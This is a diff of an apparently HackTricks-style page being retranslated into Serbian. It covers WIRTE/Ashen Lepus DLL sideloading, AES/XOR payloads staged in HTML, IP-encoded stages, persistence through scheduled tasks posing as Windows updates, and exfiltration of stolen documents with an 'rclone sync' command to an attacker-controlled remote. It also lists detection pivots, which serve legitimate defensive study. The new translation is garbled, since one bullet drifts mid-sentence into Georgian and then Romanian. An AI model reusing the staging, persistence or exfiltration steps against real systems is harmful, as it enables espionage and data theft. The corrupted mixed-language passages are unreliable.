@@ -1,24 +1,25 @@
-# Advanced DLL Side-Loading With HTML-Embedded Payload Staging
+# Napredno DLL sideloading sa insceniranjem payload-a ugrađenih u HTML
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Pregled Tradecraft-a
+## Pregled tradecraft-a
 
-Ashen Lepus (poznat i kao WIRTE) weaponized je ponovljiv obrazac koji povezuje DLL sideloading, staged HTML payloads i modularne .NET backdoors radi persistence unutar diplomatskih mreža Bliskog istoka. Ovu tehniku može ponovo koristiti bilo koji operator zato što se oslanja na:<sup>[[1]](#references)</sup>
+Ashen Lepus (poznat i kao WIRTE) prilagodio je ponovljiv obrazac koji povezuje DLL sideloading, inscenirane HTML payload-e i modularna .NET backdoor rešenja radi opstanka unutar diplomatskih mreža Bliskog istoka. Ovu tehniku može ponovo da upotrebi bilo koji operater, jer se oslanja na:<sup>[[1]](#references)</sup>
 
-- **Archive-based social engineering**: bezopasni PDF-ovi upućuju mete da preuzmu RAR arhivu sa file-sharing sajta. Arhiva sadrži EXE koji izgleda kao pravi document viewer, malicious DLL nazvan po pouzdanoj biblioteci (npr. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) i mamac `Document.pdf`.
-- **DLL search order abuse**: žrtva dvaput klikne na EXE, Windows učitava DLL import iz trenutnog direktorijuma, a malicious loader (AshenLoader) izvršava se unutar pouzdanog procesa dok se mamac PDF otvara kako bi se izbegla sumnja.
-- **Living-off-the-land staging**: svaka naredna faza (AshenStager → AshenOrchestrator → modules) čuva se van diska dok ne bude potrebna, a isporučuje se kao encrypted blobs skriven unutar inače bezopasnih HTML odgovora.
+- **Društveni inženjering zasnovan na arhivama**: bezazleni PDF-ovi upućuju mete da preuzmu RAR arhivu sa sajta za deljenje datoteka. Arhiva sadrži EXE koji izgleda kao pravi pregledač dokumenata, zlonamerni DLL nazvan po pouzdanoj biblioteci (npr. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) i lažni `Document.pdf`.
+- **Zloupotreba redosleda pretrage DLL-ova**: žrtva dvaput klikne na EXE, Windows učitava DLL import iz trenutnog direktorijuma, a zlonamerni loader (AshenLoader) izvršava se unutar pouzdanog procesa dok se lažni PDF otvara kako bi se izbegla sumnja.
+- **Insceniranje pomoću alata koji su već prisutni na sistemu**: svaka naredna faza (AshenStager → AshenOrchestrator → moduli) ostaje van diska dok ne zatreba, a isporučuje se kao šifrovani blob sakriven u inače bezazlenim HTML odgovorima.
 
-## Multi-Stage Side-Loading Chain
+## Višefazni lanac sideloading-a
 
-1. **Decoy EXE → AshenLoader**: EXE vrši side-load AshenLoader-a, koji prikuplja podatke o hostu, AES-CTR ih encrypt-uje i šalje POST zahtevom unutar promenljivih parametara kao što su `token=`, `id=`, `q=` ili `auth=` ka putanjama koje izgledaju kao API (npr. `/api/v2/account`).<sup>[[1]](#references)</sup>
-2. **HTML extraction**: C2 otkriva narednu fazu samo kada se IP adresa klijenta geolocira u ciljanu regiju i kada se `User-Agent` podudara sa implantom, čime se otežava analiza u sandbox-ima. Kada provere prođu, HTTP telo sadrži blob `<headerp>...</headerp>` sa Base64/AES-CTR encrypted AshenStager payload-om.
-3. **Second sideload**: AshenStager se deploy-uje uz drugi legitimni binary koji importuje `wtsapi32.dll`. Malicious kopija ubačena u binary preuzima još HTML sadržaja, ovog puta izdvajajući `<article>...</article>` kako bi povratila AshenOrchestrator.
-4. **AshenOrchestrator**: modularni .NET controller koji dekodira Base64 JSON config. Polja `tg` i `au` iz config-a konkateniraju se i hash-uju u AES key, koji decrypt-uje `xrk`. Dobijeni bytes služe kao XOR key za svaki module blob koji se naknadno preuzme.
-5. **Module delivery**: svaki module opisan je kroz HTML comments koji parser preusmeravaju na proizvoljni tag, čime se zaobilaze statička pravila koja proveravaju samo `<headerp>` ili `<article>`. Modules obuhvataju persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) i file exploration (`FE`).
+1. **Lažni EXE → AshenLoader**: EXE učitava AshenLoader putem sideloading-a; AshenLoader prikuplja podatke o hostu, šifruje ih pomoću AES-CTR-a i šalje ih POST zahtevom u promenljivim parametrima kao što su `token=`, `id=`, `q=` ili `auth=` ka putanjama koje liče na API (npr. `/api/v2/account`).<sup>[[1]](#references)</sup>
+2. **Izdvajanje iz HTML-a**: C2 otkriva narednu fazu samo kada se utvrdi da se IP adresa klijenta geografski nalazi u ciljnom regionu i kada se `User-Agent` podudara sa implantom, čime se ometaju sandbox okruženja. Kada provere prođu, HTTP telo sadrži blob `<headerp>...</headerp>` sa Base64/AES-CTR šifrovanim payload-om AshenStager-a.
+3. **Drugi sideload**: AshenStager se postavlja uz drugi legitimni binarni fajl koji importuje `wtsapi32.dll`. Zlonamerna kopija ubrizgana u binarni fajl preuzima dodatni HTML i ovog puta izdvaja `<article>...</article>` da bi povratila AshenOrchestrator.
+4. **AshenOrchestrator**: modularni .NET kontroler koji dekodira Base64 JSON konfiguraciju. Polja `tg` i `au` iz konfiguracije spajaju se i heširaju da bi se dobio AES ključ, koji dešifruje `xrk`. Dobijeni bajtovi služe kao XOR ključ za svaki naredni preuzeti blob modula.
+5. **Isporuka modula**: svaki modul opisuju HTML komentari koji parser preusmeravaju na proizvoljnu oznaku, zaobilazeći statička pravila koja proveravaju samo `<headerp>` ili `<article>`. Moduli obuhvataju persistence (`PR*`), deinstalacione programe (`UN*`), izviđanje (`SN`), snimanje ekrana (`SCT`) i istraživanje datoteka (`FE`).
 
-### HTML Container Parsing Pattern
+### Obrazac za parsiranje HTML kontejnera
+
 ```csharp
 var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
 var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
@@ -26,9 +27,11 @@ var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
 var module = XorBytes(aesBytes, xorKey);
 LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
 ```
-Čak i ako branioci blokiraju ili uklone određeni element, operater samo treba da promeni oznaku navedenu u HTML komentaru kako bi nastavio isporuku.<sup>[[1]](#references)</sup>
 
-### Brzi pomoćni alat za ekstrakciju (Python)
+Čak i ako branioci blokiraju ili uklone određeni element, operator treba samo da promeni tag naveden u HTML komentaru da bi nastavio isporuku.<sup>[[1]](#references)</sup>
+
+### Brzi pomoćnik za izdvajanje (Python)
+
 ```python
 import base64, re, requests
 
@@ -38,18 +41,20 @@ b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
 blob = base64.b64decode(b64)
 # decrypt blob with AES-CTR, then XOR if required
 ```
-## Paralele HTML Staging Evasion-a
 
-Nedavna istraživanja HTML smuggling-a (Talos) ističu payload-e skrivene kao Base64 stringove unutar `<script>` blokova u HTML attachment-ima, koji se dekodiraju pomoću JavaScript-a tokom izvršavanja.<sup>[[2]](#references)</sup> Isti trik može ponovo da se iskoristi za C2 odgovore: stage-ovati enkriptovane blob-ove unutar script taga (ili drugog DOM elementa) i dekodirati ih u memoriji pre AES/XOR obrade, čime stranica izgleda kao običan HTML. Talos takođe prikazuje višeslojnu obfuscation (preimenovanje identifikatora uz Base64/Caesar/AES) unutar script tagova, što se direktno može primeniti na HTML-staged C2 blob-ove.<sup>[[2]](#references)</sup> Kasniji Talos writeup o **hidden text salting-u** takođe je relevantan: razdvajanje Base64 sadržaja pomoću nebitnih HTML komentara ili whitespace-a dovoljno je da pokvari jednostavne regex extractore, dok rekonstrukcija na strani browser-a ostaje trivijalna.<sup>[[7]](#references)</sup>
+## Paralele sa izbegavanjem detekcije pomoću HTML staginga
+
+Nedavna istraživanja HTML smugglinga (Talos) ističu payload-e skrivene kao Base64 stringovi unutar `<script>` blokova u HTML prilozima, koji se dekodiraju pomoću JavaScripta tokom izvršavanja.<sup>[[2]](#references)</sup> Isti trik može ponovo da se upotrebi za C2 odgovore: postaviti šifrovane blobove unutar script taga (ili drugog DOM elementa) i dekodirati ih u memoriji pre AES/XOR obrade, tako da stranica izgleda kao običan HTML. Talos takođe prikazuje višeslojnu obfuskaciju (preimenovanje identifikatora uz Base64/Caesar/AES) unutar script tagova, što se lako primenjuje na C2 blobove staged u HTML-u.<sup>[[2]](#references)</sup> Kasniji Talos tekst o **hidden text salting** tehnici takođe je relevantan: razdvajanje Base64 sadržaja nebitnim HTML komentarima ili razmacima dovoljno je da zbuni jednostavne regex ekstraktore, dok rekonstrukcija u browseru ostaje trivijalna.<sup>[[7]](#references)</sup>
 
 ## Napomene o novijim varijantama (2024-2025)
 
-- Check Point je 2024. godine primetio WIRTE campaigns koje su se i dalje oslanjale na archive-based sideloading, ali su koristile `propsys.dll` (stagerx64) kao prvu fazu. Stager dekodira sledeći payload pomoću Base64 + XOR (ključ `53`), šalje HTTP requests sa hardkodovanim `User-Agent` zaglavljem i izdvaja enkriptovane blob-ove ugrađene između HTML tagova. U jednoj grani, stage je rekonstruisan iz dugačke liste ugrađenih IP stringova dekodiranih pomoću `RtlIpv4StringToAddressA`, koji su zatim konkatenirani u payload bytes.<sup>[[3]](#references)</sup>
-- OWN-CERT je dokumentovao raniji WIRTE tooling u kojem je side-loaded `wtsapi32.dll` dropper štitio stringove pomoću Base64 + TEA i koristio samo ime DLL-a kao ključ za dekripciju, a zatim XOR/Base64-obfuscation-om obrađivao podatke za identifikaciju hosta pre njihovog slanja ka C2-u.<sup>[[4]](#references)</sup>
+- Check Point je 2024. zabeležio WIRTE kampanje koje su se i dalje oslanjale na sideloading zasnovan na arhivama, ali su koristile `propsys.dll` (stagerx64) kao prvu fazu. Stager dekodira sledeći payload pomoću Base64 + XOR (ključ `53`), šalje HTTP zahteve sa hardkodiranim `User-Agent` i izdvaja šifrovane blobove ugrađene između HTML tagova. U jednoj laენი, stage-ul a fost reconstruit dintr-o listă lungă de șiruri IP încorporate, decodate prin `RtlIpv4StringToAddressA`, apoi concatenate în octeții payloadului.<sup>[[3]](#references)</sup>
+- OWN-CERT a documentat unelte WIRTE mai vechi în care dropperul side-loaded `wtsapi32.dll` proteja șirurile cu Base64 + TEA și folosea chiar numele DLL-ului ca cheie de decriptare, apoi obfusca datele de identificare a gazdei cu XOR/Base64 înainte de a le trimite către C2.<sup>[[4]](#references)</sup>
 
-## Rekonstrukcija IP-Encoded Stage-ova
+## Rekonstrukcija IP-kodiranih stage-ova
 
-WIRTE-ova `propsys.dll` grana iz 2024. godine pokazuje da sledeći PE ne mora da se nalazi kao jedan kontinualni HTML blob. Loader može da sačuva stage bytes kao dotted-quad stringove i ponovo ih izgradi pomoću `RtlIpv4StringToAddressA`, što je obrazac blisko povezan sa Hive **IPfuscation** tradecraft-om.<sup>[[3]](#references)[[5]](#references)</sup> Operativno, ovo je korisno kada actor želi da HTML stranica sadrži ono što izgleda kao bezopasni IOCs ili config data, umesto očiglednog Base64 payload-a.
+WIRTE-ova grana iz 2024. sa `propsys.dll` pokazuje da sledeći PE ne mora da bude smešten kao jedan neprekinuti HTML blob. Loader može da pohrani bajtove stage-a kao stringove u formatu dotted-quad i ponovo ih sastavi pomoću `RtlIpv4StringToAddressA`, što je obrazac blisko povezan sa Hive-ovim **IPfuscation** tradecraftom.<sup>[[3]](#references)[[5]](#references)</sup> Operativno, ovo je korisno kada akter želi da HTML stranica sadrži ono što izgleda kao bezazleni IOC-ovi ili konfiguracioni podaci, umesto očiglednog Base64 payloada.
+
 ```python
 import pathlib, re, socket
 
@@ -58,67 +63,67 @@ ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
 blob = b"".join(socket.inet_aton(ip) for ip in ips)
 pathlib.Path("stage.bin").write_bytes(blob)
 ```
-Ako oporavljeni bajtovi počinju sa `MZ`, verovatno ste direktno rekonstruisali sledeći PE. Ako ne, proverite da li postoji početni XOR/Base64 sloj ili mali delimiter chunks između adresa.
 
-## Zamenljiva DLL imena i rotacija hostova
+Ako oporavljeni bajtovi počinju sa `MZ`, verovatno ste direktno rekonstruisali sledeći PE. Ako ne, proverite da li postoji početni XOR/Base64 sloj ili mali delimiterski segmenti između adresa.
 
-Važna osobina ovog patterna jeste to što **HTML/AES/XOR staging backend može ostati identičan dok se menja samo sideload par**. WIRTE je kroz različite campaigns rotirao `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` i `propsys.dll`, što je korisno zato što:<sup>[[1]](#references)[[3]](#references)</sup>
+## Zamenljiva imena DLL-ova i rotacija hostova
 
-- `propsys.dll` i `wtsapi32.dll` su uobičajena Windows DLL imena za koja defenderi očekuju da postoje u `%System32%` / `%SysWOW64%`.
-- Javni katalozi, kao što je **HijackLibs**, već mapiraju mnoge binary-je koji će učitati ta DLL imena iz kopiranog application direktorijuma, što operatorima daje replacement hostove bez redizajniranja stagera.
-- Samo export surface mora biti prilagođen svakom hostu. HTML parser, AES/XOR rutine i module loader obično se mogu neizmenjeni preneti u forwarding proxy DLL.
+Važno svojstvo ovog obrasca je da **backend za HTML/AES/XOR staging može ostati nepromenjen, dok se menja samo par za sideloading**. WIRTE je tokom kampanja rotirao između `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` i `propsys.dll`, što je korisno jer:<sup>[[1]](#references)[[3]](#references)</sup>
 
-Za offensive lab rad, to znači da problem možete podeliti na **(1) pronalaženje stabilnog potpisanog hosta koji lokalno razrešava izabrano DLL ime** i **(2) ponovnu upotrebu iste staged-HTML loader logike iza tog DLL-a**.
+- `propsys.dll` i `wtsapi32.dll` su uobičajena imena Windows DLL-ova za koja branioci očekuju da postoje u `%System32%` / `%SysWOW64%`.
+- Javni katalozi kao što je **HijackLibs** već mapiraju mnoge binarne fajlove koji će učitavati ta imena DLL-ova iz direktorijuma kopirane aplikacije, pa operatori mogu da zamene hostove bez redizajniranja stagera.
+- Potrebno je prilagoditi samo export površinu za svaki host. HTML parser, AES/XOR rutine i module loader obično se mogu neizmenjeni preneti u forwarding proxy DLL.
 
-## Crypto i ojačavanje C2
+Za rad u ofanzivnoj laboratoriji to znači da problem možete podeliti na **(1) pronalaženje stabilnog, potpisanog hosta koji lokalno razrešava izabrano ime DLL-a** i **(2) ponovnu upotrebu iste logike staged-HTML loader-a iza tog DLL-a**.
 
-- **AES-CTR svuda**: aktuelni loaderi sadrže 256-bitne ključeve i nonce-ove (npr. `{9a 20 51 98 ...}`), a opciono dodaju XOR sloj koristeći strings kao što je `msasn1.dll` pre ili posle decryption-a.<sup>[[1]](#references)</sup>
-- **Varijacije key material-a**: raniji loaderi koristili su Base64 + TEA za zaštitu embedded strings, pri čemu je decryption key izveden iz imena malicioznog DLL-a (npr. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
-- **Infrastructure split + camouflage subdomain-a**: staging serveri su razdvojeni po tool-u, hostovani na različitim ASN-ovima i ponekad postavljeni iza subdomain-a koji izgledaju legitimno, tako da kompromitovanje jednog stage-a ne otkriva ostatak.
-- **Recon smuggling**: enumerisani podaci sada uključuju listings direktorijuma Program Files radi pronalaženja high-value aplikacija i uvek se encryptuju pre napuštanja hosta.
-- **URI churn**: query parametri i REST paths rotiraju se između campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), čime se brittle detections čine nevažećim.
-- **User-Agent pinning + bezbedni redirects**: C2 infrastructure odgovara samo na tačne UA strings, a u suprotnom redirektuje na benign news/health sajtove radi boljeg uklapanja u normalan saobraćaj.
-- **Gated delivery**: serveri koriste geo-fencing i odgovaraju samo pravim implantima. Neodobreni klijenti dobijaju bezopasan HTML.
+## Ojačavanje kriptografije i C2
 
-## Persistence i execution loop
+- **AES-CTR svuda**: aktuelni loader-i sadrže 256-bitne ključeve i nonce-ove (npr. `{9a 20 51 98 ...}`), uz opciono dodavanje XOR sloja pomoću stringova kao što je `msasn1.dll` pre ili posle dešifrovanja.<sup>[[1]](#references)</sup>
+- **Varijacije ključnog materijala**: raniji loader-i koristili su Base64 + TEA za zaštitu ugrađenih stringova, pri čemu je ključ za dešifrovanje izveden iz imena zlonamernog DLL-a (npr. `wtsapi32.dll`).<sup>[[4]](#references)</sup>
+- **Razdvajanje infrastrukture + prikrivanje poddomenima**: staging serveri su razdvojeni po alatima, hostuju se na različitim ASN-ovima, a ponekad se nalaze iza poddomena koji izgledaju legitimno, tako da kompromitovanje jednog stage-a ne otkriva ostale.
+- **Krijumčarenje izviđačkih podataka**: popisani podaci sada obuhvataju i sadržaj direktorijuma Program Files radi pronalaženja vrednih aplikacija i uvek se šifruju pre slanja sa hosta.
+- **Rotacija URI-ja**: query parametri i REST putanje menjaju se između kampanja (`/api/v1/account?token=` → `/api/v2/account?auth=`), čime se poništavaju krhke detekcije.
+- **Zaključavanje User-Agent-a + bezbedna preusmeravanja**: C2 infrastruktura odgovara samo na tačne UA stringove, a u suprotnom preusmerava na bezazlene vesti ili zdravstvene sajtove kako bi se uklopila u uobičajeni saobraćaj.
+- **Ograničena isporuka**: serveri su geografski ograničeni i odgovaraju samo pravim implantima. Neodobreni klijenti dobijaju neupadljiv HTML.
 
-AshenStager kreira scheduled tasks koji se predstavljaju kao Windows maintenance jobs i izvršavaju putem `svchost.exe`, na primer:<sup>[[1]](#references)</sup>
+## Postojanost i ciklus izvršavanja
+
+AshenStager kreira zakazane zadatke koji se predstavljaju kao Windows poslovi održavanja i izvršavaju preko `svchost.exe`, na primer:<sup>[[1]](#references)</sup>
 
 - `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
 - `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
 - `C:\Windows\System32\Tasks\Automatic Windows Update`
 
-Ovi tasks ponovo pokreću sideloading chain pri boot-u ili u određenim intervalima, čime se obezbeđuje da AshenOrchestrator može da zatraži sveže module bez ponovnog upisivanja na disk.
+Ovi zadaci ponovo pokreću sideloading lanac pri pokretanju sistema ili u određenim intervalima, čime AshenOrchestrator može da zahteva sveže module bez ponovnog pristupa disku.
 
-## Korišćenje benignih sync klijenata za exfiltration
+## Korišćenje legitimnih klijenata za sinhronizaciju radi eksfiltracije
 
-Operatori smeštaju diplomatska dokumenta unutar `C:\Users\Public` (čitljivo svim korisnicima i bezazlenog izgleda) putem dedicated module-a, a zatim preuzimaju legitimni [Rclone](https://rclone.org/) binary radi sinhronizacije tog direktorijuma sa attacker storage-om. Unit42 navodi da je ovo prvi put da je ovaj actor primećen kako koristi Rclone za exfiltration, što se uklapa u širi trend zloupotrebe legitimnih sync tool-ova radi uklapanja u normalan saobraćaj:<sup>[[1]](#references)</sup>
+Operatori pomoću namenski napravljenog modula smeštaju diplomatska dokumenta u `C:\Users\Public` (čitljiv za sve korisnike i neupadljiv), a zatim preuzimaju legitimni binarni fajl [Rclone](https://rclone.org/) za sinhronizaciju tog direktorijuma sa skladištem koje kontroliše napadač. Unit42 navodi da je ovo prvi put da je primećeno da ovaj akter koristi Rclone za eksfiltraciju, što se uklapa u širi trend zloupotrebe legitimnih alata za sinhronizaciju radi stapanja sa uobičajenim saobraćajem:<sup>[[1]](#references)</sup>
 
-1. **Staging**: kopirajte/prikupite ciljane fajlove u `C:\Users\Public\{campaign}\`.
-2. **Konfiguracija**: isporučite Rclone config koji pokazuje na HTTPS endpoint pod kontrolom attackera (npr. `api.technology-system[.]com`).
-3. **Sinhronizacija**: pokrenite `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` tako da saobraćaj podseća na uobičajene cloud backup-e.
+1. **Priprema**: kopirajte/prikupite ciljne fajlove u `C:\Users\Public\{campaign}\`.
+2. **Konfiguracija**: isporučite Rclone konfiguraciju koja upućuje na HTTPS endpoint pod kontrolom napadača (npr. `api.technology-system[.]com`).
+3. **Sinhronizacija**: pokrenite `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` kako bi saobraćaj ličio na uobičajene cloud rezervne kopije.
 
-Pošto se Rclone široko koristi za legitimne backup workflow-e, defenderi moraju da se usredsrede na anomalna izvršavanja (novi binary-ji, neobični remote-ovi ili iznenadna sinhronizacija sadržaja iz `C:\Users\Public`).
+Pošto se Rclone često koristi za legitimne procese pravljenja rezervnih kopija, branioci treba da se usredsrede na neuobičajena izvršavanja (novi binarni fajlovi, sumnjivi udaljeni repozitorijumi ili iznenadna sinhronizacija sadržaja iz `C:\Users\Public`).
 
-## Detection pivots
+## Tačke za detekciju
 
-- Upozoravajte na **potpisane procese** koji neočekivano učitavaju DLL-ove iz putanja u koje korisnici mogu da upisuju (Procmon filters + `Get-ProcessMitigation -Module`), naročito kada se imena DLL-ova poklapaju sa `netutils`, `srvcli`, `dwampi`, `wtsapi32` ili `propsys`.<sup>[[6]](#references)</sup>
-- Analizirajte sumnjive HTTPS responses za **velike Base64 blobove ugrađene unutar neuobičajenih tags** ili zaštićene komentarima `<!-- TAG: <xyz> -->`.
-- Prvo normalizujte HTML: **uklonite komentare i sažmite whitespace pre Base64 extraction-a**, jer evasion u stilu hidden-text-salting-a može podeliti payload-e preko granica komentara.
-- Proširite HTML hunting na **Base64 strings unutar `<script>` blokova** (HTML smuggling-style staging) koji se dekoduju pomoću JavaScript-a pre AES/XOR processing-a.
-- Pratite ponovljene pozive ka **`RtlIpv4StringToAddressA` praćene sklapanjem buffera**, naročito kada su okolni strings dugačke IPv4 liste, a ne stvarni network targets.
-- Tražite **scheduled tasks** koji pokreću `svchost.exe` sa non-service arguments ili upućuju nazad na dropper direktorijume.
-- Pratite **C2 redirects** koji vraćaju payload-e samo za tačne `User-Agent` strings, a u suprotnom vode na legitimne news/health domene.
-- Nadgledajte pojavljivanje **Rclone** binary-ja izvan IT-managed lokacija, novih `rclone.conf` fajlova ili sync jobs koji preuzimaju podatke iz staging direktorijuma kao što je `C:\Users\Public`.
+- Upozoravajte na **potpisane procese** koji neočekivano učitavaju DLL-ove iz putanja u koje korisnik može da upisuje (Procmon filteri + `Get-ProcessMitigation -Module`), naročito kada se imena DLL-ova podudaraju sa `netutils`, `srvcli`, `dwampi`, `wtsapi32` ili `propsys`.<sup>[[6]](#references)</sup>
+- Pregledajte sumnjive HTTPS odgovore u potrazi za **velikim Base64 blokovima ugrađenim u neuobičajene tagove** ili omeđenim komentarima `<!-- TAG: <xyz> -->`.
+- Prvo normalizujte HTML: **uklonite komentare i spojite višestruke razmake pre izdvajanja Base64 sadržaja**, jer izbegavanje detekcije pomoću skrivanja teksta može da podeli payload preko granica komentara.
+- Proširite HTML pretragu na **Base64 stringove unutar `<script>` blokova** (staging u stilu HTML smuggling-a), koji se dekodiraju pomoću JavaScript-a pre AES/XOR obrade.
+- Tražite ponovljene pozive funkcije **`RtlIpv4StringToAddressA`, a zatim sklapanje bafera**, naročito kada okolni stringovi predstavljaju dugačke liste IPv4 adresa, a ne stvarne mrežne ciljeve.
+- Tražite **zakazane zadatke** koji pokreću `svchost.exe` sa argumentima koji nisu vezani za servise ili upućuju nazad na direktorijume dropper-a.
+- Pratite **C2 preusmeravanja** koja vraćaju payload-e samo za tačne `User-Agent` stringove, a u suprotnom preusmeravaju na legitimne vesti ili zdravstvene domene.
+- Nadgledajte pojavu **Rclone** binarnih fajlova izvan lokacija kojima upravlja IT, nove fajlove `rclone.conf` ili poslove sinhronizacije koji preuzimaju podatke iz staging direktorijuma kao što je `C:\Users\Public`.
 
 ## References
 
-- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
-- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
-- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
-- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
-- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
-- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
-- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
-
+- [1] [Ashen Lepus, povezan sa Hamasom, cilja diplomatske subjekte na Bliskom istoku novim paketom malvera AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
+- [2] [Skriveno između tagova: uvidi u tehnike izbegavanja detekcije u HTML smuggling-u](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
+- [3] [Pretnjič koji je povezan sa Hamasom, WIRTE, nastavlja operacije na Bliskom istoku i prelazi na ometajuće aktivnosti](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
+- [4] [WIRTE: U potrazi za izgubljenim vremenom](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
+- [5] [Hive Ransomware koristi novu IPfuscation tehniku za izbegavanje detekcije](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
+- [6] [Mogući sideloading sistemskih DLL-ova sa lokacija koje nisu sistemske](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
+- [7] [Začinjavanje pretnji putem e-pošte skrivenim tekstom](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
 {{#include ../../../banners/hacktricks-training.md}}
